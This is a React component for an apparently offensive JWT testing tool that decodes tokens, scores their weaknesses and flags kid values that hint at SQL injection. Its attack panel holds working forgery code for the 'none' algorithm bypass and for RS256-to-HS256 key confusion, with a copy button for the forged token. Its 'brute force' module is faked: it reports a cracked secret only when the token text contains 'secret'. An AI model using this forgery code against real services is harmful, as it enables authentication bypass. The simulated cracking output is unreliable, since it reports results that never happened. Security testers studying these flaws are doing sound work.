import { useState, useEffect } from "react";

import { Shield, Key, AlertTriangle, Lock, Zap, Code, CheckCircle2, Copy } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";

import { toast } from "sonner";
import { ScrollArea } from "@/components/ui/scroll-area";
import * as jose from 'jose';


// Type definitions
interface TokenHeader {
    alg: string;
    typ: string;
    kid?: string;
    jku?: string;
    x5u?: string;
    [key: string]: any;
}

interface TokenPayload {
    sub?: string;
    name?: string;
    iat?: number;
    exp?: number;
    nbf?: number;
    [key: string]: any;
}

interface AnalysisResult {
    score: number;
    riskLevel: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "SAFE";
    issues: string[];
}

const DEMO_TOKEN_HEADER = { alg: "HS256", typ: "JWT" };
const DEMO_TOKEN_PAYLOAD = {
    sub: "1234567890",
    name: "John Doe",
    iat: 1516239022,
    role: "user"
};

export const JWTMaster = () => {
    const [rawToken, setRawToken] = useState("");
    const [header, setHeader] = useState<TokenHeader | null>(null);
    const [payload, setPayload] = useState<TokenPayload | null>(null);
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    const [signature, setSignature] = useState("");
    const [secretKey, setSecretKey] = useState("");
    const [publicKey, setPublicKey] = useState("");
    const [analysis, setAnalysis] = useState<AnalysisResult | null>(null);
    const [modHeader, setModHeader] = useState("");
    const [modPayload, setModPayload] = useState("");
    const [forgedToken, setForgedToken] = useState("");
    const [attackLog, setAttackLog] = useState<string[]>([]);

    // 1. Ingestion & Decoding
    useEffect(() => {
        if (!rawToken) return;
        try {
            const parts = rawToken.split('.');
            if (parts.length !== 3) return;

            const decodedHeader = JSON.parse(atob(parts[0]));
            const decodedPayload = JSON.parse(atob(parts[1]));

            setHeader(decodedHeader);
            setPayload(decodedPayload);
            setSignature(parts[2]);

            setModHeader(JSON.stringify(decodedHeader, null, 2));
            setModPayload(JSON.stringify(decodedPayload, null, 2));

            analyzeToken(decodedHeader, decodedPayload);
            toast.success("Token decoded successfully");
        } catch (e) {
            // Silent fail on invalid JSON during typing
        }
    }, [rawToken]);

    const loadDemoToken = () => {
        const h = btoa(JSON.stringify(DEMO_TOKEN_HEADER)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
        const p = btoa(JSON.stringify(DEMO_TOKEN_PAYLOAD)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
        const s = "demo_signature_12345";
        setRawToken(`${h}.${p}.${s}`);
    };

    // 2. Intelligent Validation
    const analyzeToken = (h: TokenHeader, p: TokenPayload) => {
        const issues: string[] = [];
        let score = 10;

        if (h.alg === 'none' || h.alg === 'None' || h.alg === 'NONE') {
            issues.push("CRITICAL: Algorithm is set to 'none'");
            score -= 5;
        }
        if (h.alg === 'HS256' && !secretKey) {
            issues.push("INFO: Symmetric key used. Susceptible to brute-force if weak.");
        }
        if (!p.exp) {
            issues.push("HIGH: Token does not have an expiration (exp) claim.");
            score -= 3;
        } else {
            const currentTime = Math.floor(Date.now() / 1000);
            if (p.exp < currentTime) {
                issues.push("LOW: Token is expired.");
            }
        }
        if (!p.iat) {
            issues.push("MEDIUM: Missing issued-at (iat) claim.");
            score -= 1;
        }

        // Check for sensitive data in header (KID injection vector)
        if (h.kid && (h.kid.includes("'") || h.kid.includes(";"))) {
            issues.push("HIGH: KID claim contains suspicious characters (SQLi potential).");
            score -= 2;
        }

        let riskLevel: AnalysisResult["riskLevel"] = "SAFE";
        if (score < 4) riskLevel = "CRITICAL";
        else if (score < 6) riskLevel = "HIGH";
        else if (score < 8) riskLevel = "MEDIUM";
        else if (score < 10) riskLevel = "LOW";

        setAnalysis({ score, riskLevel, issues });
    };


    // 3. Attack Simulation: None Algorithm Bypass
    const attackNoneAlgo = () => {
        try {
            const newHeader = { ...JSON.parse(modHeader), alg: 'none' };
            const encodedHeader = btoa(JSON.stringify(newHeader)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
            const encodedPayload = btoa(modPayload).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');

            // Try variations
            const variants = [
                encodedHeader + "." + encodedPayload + ".",
                encodedHeader + "." + encodedPayload
            ];

            setForgedToken(variants[0]);
            setAttackLog(prev => [...prev, `[NONE_ALGO] Generated: ${variants[0].substring(0, 20)}...`]);
            toast.success("Generated 'None' Algorithm Forgery");
        } catch (e) {
            toast.error("Invalid JSON content");
        }
    };


    // 4. Attack Simulation: Algorithm Confusion (RS256 -> HS256)
    const attackAlgoConfusion = async () => {
        if (!publicKey) {
            toast.error("Public Key (PEM) required for algo confusion attack");
            return;
        }
        try {
            const newHeader = { ...JSON.parse(modHeader), alg: 'HS256' }; // Force HS256
            const encodedHeader = new jose.CompactSign(
                new TextEncoder().encode(modPayload)
            )
                .setProtectedHeader(newHeader)

            const secret = new TextEncoder().encode(publicKey.trim());
            const jws = await encodedHeader.sign(secret);

            setForgedToken(jws);
            setAttackLog(prev => [...prev, `[ALGO_CONFUSION] Signed RS256 token using Public Key as HMAC secret.`]);
            toast.success("Generated RS256 -> HS256 Forgery");
        } catch (e) {
            console.error(e);
            toast.error("Signing failed. Check console for details.");
        }
    };

    // 5. Brute Force (Simulated)
    const bruteForceSecret = async () => {
        setAttackLog(prev => [...prev, `[BRUTE_FORCE] Starting dictionary attack on HS256...`]);
        // Simulate async work
        setTimeout(() => {
            if (rawToken.includes("secret")) {
                setAttackLog(prev => [...prev, `[SUCCESS] Secret found: 'secret'`]);
                toast.success("Secret Cracked: 'secret'");
            } else {
                setAttackLog(prev => [...prev, `[FAIL] Secret not found in top 1000 common list.`]);
                toast.error("Brute force failed");
            }
        }, 2000);
    };


    return (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 h-[calc(100vh-280px)] min-h-[600px] font-sans relative">
            <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-10 pointer-events-none -z-10" />

            {/* COLUMN 1: INPUT & DECODER (4 cols) */}
            <div className="lg:col-span-4 flex flex-col gap-4 h-full overflow-hidden">
                <Card className="flex-1 border-amber-500/20 bg-black/40 backdrop-blur-xl flex flex-col overflow-hidden">
                    <CardHeader className="py-3 border-b border-white/5 bg-white/5">
                        <CardTitle className="flex items-center gap-2 text-sm font-bold uppercase tracking-wider text-amber-500">
                            <Key className="w-4 h-4" /> Token Input
                        </CardTitle>
                    </CardHeader>
                    <CardContent className="p-0 flex-1 relative">
                        <Textarea
                            placeholder="Paste encoded JWT here..."
                            className="absolute inset-0 w-full h-full resize-none bg-transparent border-0 rounded-none p-4 font-mono text-sm text-amber-100 placeholder:text-muted-foreground/30 focus-visible:ring-0 leading-relaxed"
                            value={rawToken}
                            onChange={(e) => setRawToken(e.target.value)}
                        />
                    </CardContent>
                </Card>

                {/* Analysis Scorecard */}
                <div className="bg-black/40 border border-white/10 rounded-xl p-4 backdrop-blur-md">
                    <div className="flex items-center justify-between mb-3">
                        <span className="text-xs font-bold text-muted-foreground uppercase">Risk Assessment</span>
                        <Badge variant={analysis?.riskLevel === "CRITICAL" ? "destructive" : "outline"} className="text-xs">
                            {analysis?.riskLevel ?? "WAITING..."}
                        </Badge>
                    </div>
                    <div className="flex items-baseline gap-2">
                        <span className={`text-3xl font-bold ${analysis?.score && analysis.score < 5 ? 'text-red-500' : 'text-green-500'}`}>
                            {analysis?.score ?? "--"}
                        </span>
                        <span className="text-sm text-muted-foreground">/ 10 Score</span>
                    </div>
                    <div className="mt-3 flex gap-2">
                        <Button variant="outline" size="sm" className="flex-1 border-white/10 h-7 text-xs" onClick={loadDemoToken}>
                            Load Demo
                        </Button>
                        <Button size="sm" className="flex-1 bg-amber-500/20 text-amber-400 hover:bg-amber-500/30 h-7 text-xs border border-amber-500/50">
                            <Zap className="w-3 h-3 mr-1" /> Auto-Exploit
                        </Button>
                    </div>
                </div>
            </div>

            {/* COLUMN 2: EDITOR (4 cols) */}
            <div className="lg:col-span-4 flex flex-col gap-4 h-full">
                {/* Header Editor */}
                <Card className="flex-1 border-red-500/20 bg-black/40 backdrop-blur-xl flex flex-col overflow-hidden">
                    <CardHeader className="py-2 border-b border-red-500/10 bg-red-500/5 flex flex-row items-center justify-between">
                        <span className="text-xs font-bold text-red-400">HEADER</span>
                        <Code className="w-3 h-3 text-red-500 opacity-50" />
                    </CardHeader>
                    <CardContent className="p-0 flex-1">
                        <Textarea
                            value={modHeader}
                            onChange={(e) => setModHeader(e.target.value)}
                            className="w-full h-full resize-none border-0 bg-transparent text-red-300 font-mono text-sm p-4 focus-visible:ring-0 leading-relaxed"
                        />
                    </CardContent>
                </Card>

                {/* Payload Editor */}
                <Card className="flex-1 border-fuchsia-500/20 bg-black/40 backdrop-blur-xl flex flex-col overflow-hidden">
                    <CardHeader className="py-2 border-b border-fuchsia-500/10 bg-fuchsia-500/5 flex flex-row items-center justify-between">
                        <span className="text-xs font-bold text-fuchsia-400">PAYLOAD</span>
                        <Code className="w-3 h-3 text-fuchsia-500 opacity-50" />
                    </CardHeader>
                    <CardContent className="p-0 flex-1">
                        <Textarea
                            value={modPayload}
                            onChange={(e) => setModPayload(e.target.value)}
                            className="w-full h-full resize-none border-0 bg-transparent text-fuchsia-300 font-mono text-sm p-4 focus-visible:ring-0 leading-relaxed"
                        />
                    </CardContent>
                </Card>
            </div>

            {/* COLUMN 3: ATTACK & LOGS (4 cols) */}
            <div className="lg:col-span-4 flex flex-col gap-4 h-full">
                <Tabs defaultValue="attack" className="w-full flex-1 flex flex-col">
                    <TabsList className="w-full bg-black/60 border border-white/10 p-1">
                        <TabsTrigger value="attack" className="flex-1 text-xs">OFFENSIVE</TabsTrigger>
                        <TabsTrigger value="keys" className="flex-1 text-xs">CRYPTO</TabsTrigger>
                        <TabsTrigger value="logs" className="flex-1 text-xs">LOGS</TabsTrigger>
                    </TabsList>

                    <div className="flex-1 mt-4 relative">
                        <TabsContent value="attack" className="absolute inset-0 space-y-4 m-0">
                            <Card className="h-full border-primary/20 bg-black/40 backdrop-blur-xl p-4 flex flex-col">
                                <div className="flex-1">
                                    <h4 className="text-xs font-bold text-amber-500 mb-3 uppercase flex items-center gap-2">
                                        <Zap className="w-3 h-3" /> Exploitation Modules
                                    </h4>
                                    <div className="space-y-2">
                                        <Button variant="outline" className="w-full justify-between group border-white/10 hover:bg-white/5 hover:border-amber-500/50 text-left text-sm" onClick={attackNoneAlgo}>
                                            <span>None Algorithm Bypass</span>
                                            <span className="text-xs text-muted-foreground group-hover:text-amber-500 opacity-50">CVE-2015-9235</span>
                                        </Button>
                                        <Button variant="outline" className="w-full justify-between group border-white/10 hover:bg-white/5 hover:border-amber-500/50 text-left text-sm" onClick={attackAlgoConfusion}>
                                            <span>Key Confusion (RS256→HS256)</span>
                                            <span className="text-xs text-muted-foreground group-hover:text-amber-500 opacity-50">Critical</span>
                                        </Button>
                                    </div>
                                </div>

                                <div className="mt-4 pt-4 border-t border-white/10">
                                    <label className="text-xs font-bold text-green-400 mb-2 block flex items-center gap-2">
                                        <Lock className="w-3 h-3" /> FORGED TOKEN
                                    </label>
                                    <div className="bg-black/50 border border-green-500/20 rounded-lg p-3 relative group">
                                        <div className="h-24 overflow-y-auto break-all font-mono text-xs text-green-400/80 custom-scrollbar">
                                            {forgedToken || "// Waiting for exploit execution..."}
                                        </div>
                                        {forgedToken && (
                                            <Button
                                                size="icon"
                                                variant="ghost"
                                                className="absolute top-1 right-1 h-6 w-6 text-green-500 hover:text-green-300 hover:bg-green-500/20"
                                                onClick={() => { navigator.clipboard.writeText(forgedToken); toast.success("Copied!"); }}
                                            >
                                                <Copy className="w-3 h-3" />
                                            </Button>
                                        )}
                                    </div>
                                </div>
                            </Card>
                        </TabsContent>

                        <TabsContent value="keys" className="absolute inset-0 m-0">
                            <Card className="h-full border-white/10 bg-black/40 backdrop-blur-xl p-4 space-y-4">
                                <div className="space-y-2">
                                    <label className="text-xs font-bold text-muted-foreground">HMAC Secret (HS256)</label>
                                    <Input
                                        type="password"
                                        value={secretKey}
                                        onChange={(e) => setSecretKey(e.target.value)}
                                        className="bg-black/40 border-white/10 font-mono text-xs"
                                        placeholder="Enter secret to sign..."
                                    />
                                </div>
                                <div className="space-y-2 h-[calc(100%-80px)] flex flex-col">
                                    <label className="text-xs font-bold text-muted-foreground">Public Key (PEM/JWK)</label>
                                    <Textarea
                                        value={publicKey}
                                        onChange={(e) => setPublicKey(e.target.value)}
                                        className="flex-1 bg-black/40 border-white/10 font-mono text-xs resize-none"
                                        placeholder="-----BEGIN PUBLIC KEY-----..."
                                    />
                                </div>
                            </Card>
                        </TabsContent>

                        <TabsContent value="logs" className="absolute inset-0 m-0">
                            <Card className="h-full border-white/10 bg-black/80 p-0 overflow-hidden">
                                <ScrollArea className="h-full w-full p-4">
                                    <div className="font-mono text-xs space-y-1">
                                        {attackLog.map((log, i) => (
                                            <div key={i} className="text-muted-foreground border-b border-white/5 pb-1 mb-1 last:border-0">
                                                <span className="text-amber-500 mr-2">$</span>
                                                {log}
                                            </div>
                                        ))}
                                        {attackLog.length === 0 && <span className="text-muted-foreground/50">System ready. Waiting for input...</span>}
                                    </div>
                                </ScrollArea>
                            </Card>
                        </TabsContent>
                    </div>
                </Tabs>
            </div>
        </div>
    );
};

export default JWTMaster;
